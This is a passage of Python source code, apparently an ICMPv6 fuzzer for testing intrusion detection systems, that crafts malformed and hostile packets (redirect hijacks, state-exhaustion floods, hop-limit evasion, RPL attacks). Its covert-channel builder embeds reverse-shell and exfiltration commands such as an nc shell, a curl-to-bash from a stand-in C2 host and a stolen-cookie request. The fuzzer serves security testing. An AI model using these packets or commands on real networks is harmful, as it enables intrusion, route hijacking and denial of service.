        "zero_mtu", "below_minimum", "one_byte_mtu", "max_mtu",
        "tcp_conn_target", "contradictory", "oscillating",
    ])
    src = _rand_link_local()
    dst = _rand_link_local()

    inner = _fake_inner_ipv6(dst, _rand_global(), next_header=6, payload_len=1500) + _tcp8v6()

    if variant == "zero_mtu":
        mtu = 0
    elif variant == "below_minimum":
        mtu = random.randint(1, 1279)
    elif variant == "one_byte_mtu":
        mtu = 1
    elif variant == "max_mtu":
        mtu = 0xFFFFFFFF
    elif variant == "tcp_conn_target":
        inner = _fake_inner_ipv6(dst, _rand_global(), next_header=6,
                                 payload_len=1500) + _tcp8v6(sport=443, dport=54321)
        mtu = 1280
    elif variant == "contradictory":
        inner = _fake_inner_ipv6(dst, _rand_global(), next_header=6, payload_len=100) + _tcp8v6()
        mtu = 9000  # MTU > packet size (contradictory)
    else:  # oscillating
        mtu = random.choice([1280, 1500, 1280, 576, 1280, 9000])

    body = struct.pack("!I", mtu) + inner
    msg, src, dst = _build_icmpv6(2, 0, body, src, dst)
    return msg, "icmpv6", src, dst


def _build_parameter_problem_pointer():
    """ICMPv6 Parameter Problem (Type 4) with pointer values targeting
    extension header chains and invalid offsets.

    Code 0: erroneous header field
    Code 1: unrecognized Next Header type
    Code 2: unrecognized IPv6 option

    Pointer is a 32-bit offset into the invoking packet.
    """
    variant = random.choice([
        "pointer_past_end", "pointer_into_ext_header", "code1_unknown_nh",
        "code2_unknown_option", "pointer_zero", "pointer_max",
        "pointer_into_payload",
    ])
    src = _rand_link_local()
    dst = _rand_link_local()
    inner = _fake_inner_ipv6(dst, _rand_global()) + _tcp8v6()

    if variant == "pointer_past_end":
        pointer = len(inner) + 100
        code = 0
    elif variant == "pointer_into_ext_header":
        pointer = 6  # points to Next Header field in IPv6 header
        code = 1
    elif variant == "code1_unknown_nh":
        inner_custom = _fake_inner_ipv6(dst, _rand_global(), next_header=253) + _tcp8v6()
        pointer = 6
        inner = inner_custom
        code = 1
    elif variant == "code2_unknown_option":
        pointer = 42  # arbitrary offset into options area
        code = 2
    elif variant == "pointer_zero":
        pointer = 0
        code = 0
    elif variant == "pointer_max":
        pointer = 0xFFFFFFFF
        code = 0
    else:  # pointer_into_payload
        pointer = 48  # past headers into TCP payload
        code = 0

    body = struct.pack("!I", pointer) + inner
    msg, src, dst = _build_icmpv6(4, code, body, src, dst)
    return msg, "icmpv6", src, dst


def _build_echo_tunnel_covert_channel():
    """ICMPv6 Echo Request/Reply payloads containing hidden data.

    Tests deep-inspection depth on ICMPv6 Echo and cross-protocol rule
    confusion.
    """
    variant = random.choice([
        "http_tunnel", "dns_tunnel", "shell_tunnel",
        "cross_proto_trigger", "depth_probe", "nested_icmpv6",
        "encrypted_xor",
    ])
    src = _rand_link_local()
    dst = _rand_link_local()

    if variant == "http_tunnel":
        payload = (b"GET /secret HTTP/1.1\r\nHost: evil.example.com\r\n"
                   b"Cookie: session=STOLEN\r\n\r\n")
    elif variant == "dns_tunnel":
        payload = (b'\x13\x37\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00'
                   b'\x04evil\x07example\x03com\x00\x00\x01\x00\x01')
    elif variant == "shell_tunnel":
        cmds = [b"/bin/sh -i", b"cat /etc/passwd", b"nc -e /bin/sh 10.0.0.1 4444",
                b"curl http://c2.example.com/beacon | bash"]
        payload = random.choice(cmds) + b'\x00' + os.urandom(32)
    elif variant == "cross_proto_trigger":
        triggers = [b"USER anonymous\r\n", b"EHLO evil.com\r\n",
                    b"SSH-2.0-OpenSSH_evil\r\n", b"\x05\x01\x00\x03"]
        payload = random.choice(triggers) + os.urandom(64)
    elif variant == "depth_probe":
        size = random.choice([100, 500, 1000, 4000, 8000, 16000, 32000])
        payload = os.urandom(size)
    elif variant == "nested_icmpv6":
        inner, _, _ = _echo6(128, 0, src=src, dst=dst, payload=os.urandom(32))
        payload = inner
    else:  # encrypted_xor
        cleartext = b"GET /admin HTTP/1.1\r\nHost: victim\r\n\r\n"
        key = random.randint(1, 255)
        payload = bytes(b ^ key for b in cleartext) + struct.pack("B", key)

    msg, src, dst = _echo6(128, 0, src=src, dst=dst, payload=payload)
    return msg, "icmpv6", src, dst


def _build_redirect_route_hijack():
    """ICMPv6 Redirect (Type 137) with malicious target addresses.

    Redirect: target_address(16) + destination_address(16) + options.
    Must be sent from link-local address of current first-hop router.

    Variants: redirect to loopback, multicast target, self-redirect,
    redirect to unspecified (::), target != destination, with redirected
    header option containing fake packet.
    """
    variant = random.choice([
        "loopback_target", "multicast_target", "self_redirect",
        "unspecified_target", "target_mismatch", "with_redirected_header",
        "flood_targets",
    ])
    src = _rand_link_local()  # "router"
    dst = _rand_link_local()  # "host"
    destination = _rand_global()

    if variant == "loopback_target":
        target = _LOOPBACK
    elif variant == "multicast_target":
        target = _ALL_NODES_LINK
    elif variant == "self_redirect":
        target = dst  # redirect host to itself
    elif variant == "unspecified_target":
        target = _UNSPECIFIED
    elif variant == "target_mismatch":
        target = _rand_link_local()  # different from destination (on-link redirect)
    elif variant == "flood_targets":
        target = _rand_link_local()
    else:  # with_redirected_header
        target = _rand_link_local()

    body = b'\x00' * 4 + target + destination  # Reserved(4) + Target(16) + Dest(16)

    if variant == "with_redirected_header":
        # Redirected Header option (Type 4): contains as much of the original
        # IP packet as possible
        fake_pkt = _fake_inner_ipv6(dst, destination) + _tcp8v6()
        opt = _ndp_option(4, b'\x00' * 6 + fake_pkt)  # 6 bytes reserved
        body += opt
    else:
        body += _ndp_tlla()

    msg, src, dst = _build_icmpv6(137, 0, body, src, dst)
    return msg, "icmpv6", src, dst


def _build_dest_unreachable_state_exhaustion():
    """ICMPv6 Destination Unreachable (Type 1) flood targeting IDS
    connection state tracking.

    All 7 codes with fabricated embedded IPv6+transport headers.
    """
    variant = random.choice([
        "unique_tuples", "all_codes", "no_route", "admin_prohibited",
        "beyond_scope", "port_unreachable", "reject_route",
    ])
    src = _rand_link_local()
    dst = _rand_link_local()

    if variant == "unique_tuples":
        inner_src = _rand_global()
        inner_dst = _rand_global()
        inner = _fake_inner_ipv6(inner_src, inner_dst, next_header=6) + _tcp8v6()
        code = random.randint(0, 6)
    elif variant == "all_codes":
        code = random.randint(0, 6)
        inner = _fake_inner_ipv6() + _tcp8v6()
    elif variant == "no_route":
        inner = _fake_inner_ipv6() + _tcp8v6()
        code = 0
    elif variant == "admin_prohibited":
        inner = _fake_inner_ipv6() + _tcp8v6()
        code = 1
    elif variant == "beyond_scope":
        inner = _fake_inner_ipv6() + _udp8v6()
        code = 2
    elif variant == "port_unreachable":
        inner = _fake_inner_ipv6(next_header=17) + _udp8v6(dport=random.randint(1, 65535))
        code = 4
    else:  # reject_route
        inner = _fake_inner_ipv6() + _tcp8v6()
        code = 6

    body = struct.pack("!I", 0) + inner  # Unused(4) + Invoking packet
    msg, src, dst = _build_icmpv6(1, code, body, src, dst)
    return msg, "icmpv6", src, dst


def _build_hop_limit_manipulation():
    """Hop Limit and Hop-by-Hop header manipulation for IDS evasion.

    Variants: hop_limit=0 (should be discarded), hop_limit=1 (triggers
    Time Exceeded at first hop), hop_limit=255 (NDP requirement),
    Router Alert in Hop-by-Hop (forces slow-path processing), conflicting
    hop limits between outer and tunneled packet.
    """
    variant = random.choice([
        "hop_zero", "hop_one", "hop_255_non_ndp",
        "router_alert", "time_exceeded_trigger", "conflicting_tunnel",
    ])
    src = _rand_link_local()
    dst = _rand_link_local()
    echo, src, dst = _echo6(128, 0, src=src, dst=dst, payload=os.urandom(32))

    if variant == "hop_zero":
        return _build_ipv6(src, dst, echo, ICMPV6_PROTO, hop_limit=0), "raw_ipv6", src, dst

    elif variant == "hop_one":
        return _build_ipv6(src, dst, echo, ICMPV6_PROTO, hop_limit=1), "raw_ipv6", src, dst

    elif variant == "hop_255_non_ndp":
        # NDP requires hop_limit=255; use it for non-NDP (Echo) — confuses validators
        return _build_ipv6(src, dst, echo, ICMPV6_PROTO, hop_limit=255), "raw_ipv6", src, dst

    elif variant == "router_alert":
        # Hop-by-Hop with Router Alert option (Type 5, Len 2, MLD=0)
        router_alert = bytes([5, 2, 0, 0])  # Router Alert: MLD
        pad = bytes([1, 0])  # PadN
        hbh = struct.pack("BB", ICMPV6_PROTO, 0) + router_alert + pad
        return _build_ipv6(src, dst, hbh + echo, next_header=0, hop_limit=1), "raw_ipv6", src, dst

    elif variant == "time_exceeded_trigger":
        # Build ICMPv6 Time Exceeded (Type 3) with hop_limit=0 in embedded
        inner = _fake_inner_ipv6(dst, _rand_global()) + _tcp8v6()
        body = struct.pack("!I", 0) + inner
        msg, src, dst = _build_icmpv6(3, 0, body, src, dst)  # Code 0 = hop limit exceeded
        return _build_ipv6(src, dst, msg, ICMPV6_PROTO, hop_limit=64), "raw_ipv6", src, dst

    else:  # conflicting_tunnel
        # IPv6-in-IPv6 tunnel with outer hop=1, inner hop=255
        inner_pkt = _build_ipv6(src, dst, echo, ICMPV6_PROTO, hop_limit=255)
        # Outer: next_header=41 (IPv6-in-IPv6), hop_limit=1
        return _build_ipv6(src, dst, inner_pkt, next_header=41, hop_limit=1), "raw_ipv6", src, dst


def _build_rpl_dao_dis_attack():
    """RPL (RFC 6550) ICMPv6 messages (Type 155) targeting IoT IDS.

    RPL Code values: DIS(0x00), DIO(0x01), DAO(0x02), DAO-ACK(0x03).

    Variants: malformed DODAG Information Object, DIS solicitation flood,
    DAO with invalid RPLInstanceID, DAO-ACK with conflicting status,
    DIO with extreme rank, crafted RPL options.
    """
    variant = random.choice([
        "malformed_dio", "dis_flood", "dao_invalid_instance",
        "dao_ack_conflict", "dio_extreme_rank", "crafted_options",
    ])
    src = _rand_link_local()
    dst = _ALL_NODES_LINK

    if variant == "malformed_dio":
        # DIO: RPLInstanceID(1)+Version(1)+Rank(2)+
        #      Grounded|MOP|Prf(1)+DTSN(1)+Flags(1)+Reserved(1)+DODAGID(16)
        body = struct.pack("!BBHBBBB", random.randint(0, 255), random.randint(0, 255),
                          0xFFFF, 0x88, random.randint(0, 255), 0, 0)
        body += os.urandom(16)  # DODAGID
        msg, src, dst = _build_icmpv6(155, 0x01, body, src, dst)

    elif variant == "dis_flood":
        # DIS: minimal, just solicits DIO responses
        body = b'\x00\x00'  # Flags + Reserved
        msg, src, dst = _build_icmpv6(155, 0x00, body, src, _ALL_NODES_LINK)

    elif variant == "dao_invalid_instance":
        # DAO with RPLInstanceID=0xFF (reserved)
        body = struct.pack("!BBBB", 0xFF, 0x80, 0,
                          random.randint(0, 255))  # Instance, K|D flags, Reserved, DAOSeq
        body += os.urandom(16)  # DODAGID
        msg, src, dst = _build_icmpv6(155, 0x02, body, src, dst)

    elif variant == "dao_ack_conflict":
        # DAO-ACK with conflicting status
        body = struct.pack("!BBBB", random.randint(0, 255),
                          random.randint(0, 255), random.randint(0, 255), 0)
        msg, src, dst = _build_icmpv6(155, 0x03, body, src, dst)

    elif variant == "dio_extreme_rank":
        # DIO with Rank = 0 (root) or 0xFFFF (infinity)
        rank = random.choice([0, 0xFFFF])
        body = struct.pack("!BBHBBBB", 0, 0, rank, 0x00, 0, 0, 0)
        body += os.urandom(16)
        msg, src, dst = _build_icmpv6(155, 0x01, body, src, dst)

    else:  # crafted_options
        # DIO with oversized RPL options
        body = struct.pack("!BBHBBBB", 0, 0, 0x100, 0x00, 0, 0, 0)
        body += os.urandom(16)  # DODAGID
        # Pad Configuration Option (type=0x04) with huge length
        body += struct.pack("BB", 0x04, 200) + os.urandom(200)
        msg, src, dst = _build_icmpv6(155, 0x01, body, src, dst)

    return msg, "icmpv6", src, dst


# ── dispatcher ───────────────────────────────────────────────────────

_BUILDERS = {
    "ndp_ra_spoofing":                   _build_ndp_ra_spoofing,
    "ndp_ns_na_confusion":               _build_ndp_ns_na_confusion,
    "ndp_option_tlv_overflow":           _build_ndp_option_tlv_overflow,
    "fragment_header_evasion":           _build_fragment_header_evasion,
    "extension_header_chain":            _build_extension_header_chain,
    "pseudo_header_checksum_desync":     _build_pseudo_header_checksum_desync,
    "mld_multicast_abuse":               _build_mld_multicast_abuse,
    "packet_too_big_pmtud":              _build_packet_too_big_pmtud,
    "parameter_problem_pointer":         _build_parameter_problem_pointer,
    "echo_tunnel_covert_channel":        _build_echo_tunnel_covert_channel,
    "redirect_route_hijack":             _build_redirect_route_hijack,
    "dest_unreachable_state_exhaustion": _build_dest_unreachable_state_exhaustion,
    "hop_limit_manipulation":            _build_hop_limit_manipulation,
    "rpl_dao_dis_attack":                _build_rpl_dao_dis_attack,
}


def build_icmpv6_payload(strategy):
    """Build an ICMPv6 fuzz payload for the given strategy.

    Returns (data, packet_type, src_ipv6, dst_ipv6) where packet_type is:
      "icmpv6"    — data is raw ICMPv6 bytes (caller wraps in IPv6)
      "fragments" — data is a list of pre-built IPv6 fragment packets
      "raw_ipv6"  — data is a complete IPv6 packet (caller adds Ethernet)
    """
    builder = _BUILDERS.get(strategy)
    if builder is None:
        msg, src, dst = _echo6(128, 0, payload=os.urandom(56))
        return msg, "icmpv6", src, dst
    return builder()


# ── mutator class ────────────────────────────────────────────────────

class Icmpv6Mutator:
    """Selects and generates ICMPv6 fuzz payloads via bandit or weighted random."""

    def __init__(self, external_weights=None, bandit=None):
        self.strategies = ICMPV6_STRATEGIES
        self._external_weights = external_weights
        self._bandit = bandit

    @property
    def weights(self):
        if self._external_weights:
            return [self._external_weights.get(s, 5) for s in self.strategies]
        return ICMPV6_WEIGHTS

    def mutate(self):
        """Returns (data, strategy_name, packet_type, src_ipv6, dst_ipv6).

        packet_type: "icmpv6" | "fragments" | "raw_ipv6"
        """
        if self._bandit:
            strategy = self._bandit.select_with_weights(self._external_weights or {})
        else:
            strategy = random.choices(self.strategies, weights=self.weights, k=1)[0]
        data, pkt_type, src, dst = build_icmpv6_payload(strategy)
        return data, strategy, pkt_type, src, dst
